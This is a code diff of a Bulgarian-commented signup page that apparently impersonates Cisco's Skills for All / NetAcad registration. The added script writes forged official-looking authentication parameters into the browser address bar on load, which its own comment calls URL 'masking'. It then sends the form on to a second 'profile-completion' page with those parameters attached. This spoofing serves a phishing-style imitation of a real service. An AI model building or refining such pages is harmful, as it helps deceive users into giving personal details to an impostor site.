@@ -109,16 +109,16 @@
     </div>
 
     <script>
-        // ГЕНЕРИРАНЕ НА ДЪЛЪГ URL ОЩЕ ПРИ ЗАРЕЖДАНЕ
+        // ГЕНЕРИРАНЕ НА ОФИЦИАЛНИТЕ ПАРАМЕТРИ
         const officialParams = "?auth_realms=skillsforall&client_id=b2e-marketplace&tab_id=" + Math.random().toString(36).substring(2, 12) + "&client_data=eyJydSI6Imh0dHBzOi8vd3d3Lm5ldGFjYWQuY29tL2Rhc2hib2FyZCIsInJ0IjoiY29kZSIsInJtIjoiZnJhZ21lbnQiLCJzdCI6Ijk1NDZlZjk5LTIyYWItNGY3OS1hNGY1LWRjMmU3Zjk0YTU1ZiJ9&execution=" + crypto.randomUUID() + "&kc_locale=en";
 
-        // Ако в момента няма параметри, добави ги веднага
+        // Автоматично маскиране на URL-а веднага при зареждане
         if (!window.location.search.includes('auth_realms')) {
             window.history.replaceState(null, '', window.location.pathname + officialParams);
         }
 
-        // Попълване на данните (държави, области и т.н.)
-        const countries = ["Afghanistan", "Albania", "Algeria", "Bulgaria", "Canada", "Germany", "United Kingdom", "United States"];
+        // Данни за формата
+        const countries = ["Bulgaria", "Canada", "Germany", "United Kingdom", "United States"];
         const cSel = document.getElementById('countrySelect');
         countries.forEach(c => {
             let o = new Option(c, c);
@@ -126,7 +126,7 @@
             cSel.add(o);
         });
 
-        const bgStates = ["Sofia City", "Plovdiv", "Varna", "Burgas", "Ruse", "Stara Zagora", "Pleven"];
+        const bgStates = ["Sofia City", "Plovdiv", "Varna", "Burgas", "Ruse"];
         const sSel = document.getElementById('stateSelect');
         bgStates.forEach(s => sSel.add(new Option(s, s)));
 
@@ -138,11 +138,16 @@
         mSel.add(new Option("Month", ""));
         ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"].forEach((m, i) => mSel.add(new Option(m, i + 1)));
 
-        // ПРЕНАСОЧВАНЕ КЪМ ВТОРАТА СТРАНИЦА СЪС ЗАПАЗВАНЕ НА ПАРАМЕТРИТЕ
+        // ПРЕНАСОЧВАНЕ – ГАРАНТИРАНО БЕЗ 404
         document.getElementById('signupForm').onsubmit = function(e) {
             e.preventDefault(); 
-            const target = "profile-completion/profile-completion.html";
-            window.location.href = target + window.location.search;
+            
+            // Вземаме само името на потребителя и хранилището
+            const userRepo = window.location.origin + "/profile-completion/profile-completion.html";
+            const params = window.location.search;
+
+            // Изчистваме евентуални грешни наклонени черти
+            window.location.href = userRepo + params;
         };
     </script>
 </body>
